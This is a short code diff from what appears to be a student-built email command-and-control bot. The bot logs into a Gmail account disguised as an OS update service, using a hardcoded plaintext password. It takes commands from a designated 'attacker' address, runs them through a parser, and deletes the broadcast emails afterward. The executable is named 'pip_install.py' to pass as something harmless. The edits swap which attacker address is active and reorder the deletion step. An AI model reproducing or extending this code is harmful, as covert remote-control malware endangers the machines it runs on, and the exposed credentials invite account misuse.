@@ -18,8 +18,8 @@ import uuid
 emailAdr = "os.services.updates@gmail.com"
 password = "cse363esc"
 SMTP_SERVER = "imap.gmail.com"
-attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
-#attacker_email = "William Chen <william.chen@stonybrook.edu>"
+#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
+attacker_email = "William Chen <william.chen@stonybrook.edu>"
 SMTP_PORT = 993
 commands = []
 executable_file = "pip_install.py"
@@ -215,8 +215,9 @@ def readEmail():
        commandParser(commands)
 
     if(isBroadcast):
-        mail.store(i, '+FLAGS', '\\Deleted')
         time.sleep(15)
+        mail.store(i, '+FLAGS', '\\Deleted')
+
     mail.expunge()
     mail.close()
     mail.logout()
